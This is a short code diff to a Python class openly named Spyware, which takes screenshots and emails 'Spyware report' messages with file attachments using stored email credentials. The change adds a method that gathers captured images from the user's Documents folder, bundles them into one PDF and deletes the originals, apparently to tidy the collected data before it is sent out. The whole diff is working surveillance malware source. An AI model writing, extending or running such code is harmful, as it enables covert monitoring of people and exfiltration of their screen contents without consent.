@@ -4,6 +4,7 @@ from mss import mss
 from threading import Thread
 import cv2
 import os
+import img2pdf
 from PIL import Image
 import shutil
 from functools import partial
@@ -29,8 +30,25 @@ class Spyware:
         try:
             send_mail(self.user_info.email, self.user_info.password, message_rep, 'Spyware report', file_path)
         except:
-            error_msg = 'Could not send that IMG'
+            error_msg = 'Could not send that'
             send_mail(self.user_info.email, self.user_info.password, error_msg, 'Spyware report', file_path)
+
+    def make_pdf(self):
+        user_path = os.path.expanduser('~\\documents')
+
+        listed_dir = os.listdir(f'{user_path}\\images_record')
+        images_with_location = [f'{user_path}\\images_record\\{a}' for a in listed_dir]
+
+        with open(f'{user_path}\\ready.pdf', 'wb') as output_pdf:
+            pdf_bytes = img2pdf.convert(images_with_location)
+
+            output_pdf.write(pdf_bytes)
+
+        for x in images_with_location:
+            try:
+                os.remove(x)
+            except:
+                pass
 
     def make_screenshot(self):
         user_path = os.path.expanduser('~\\documents')
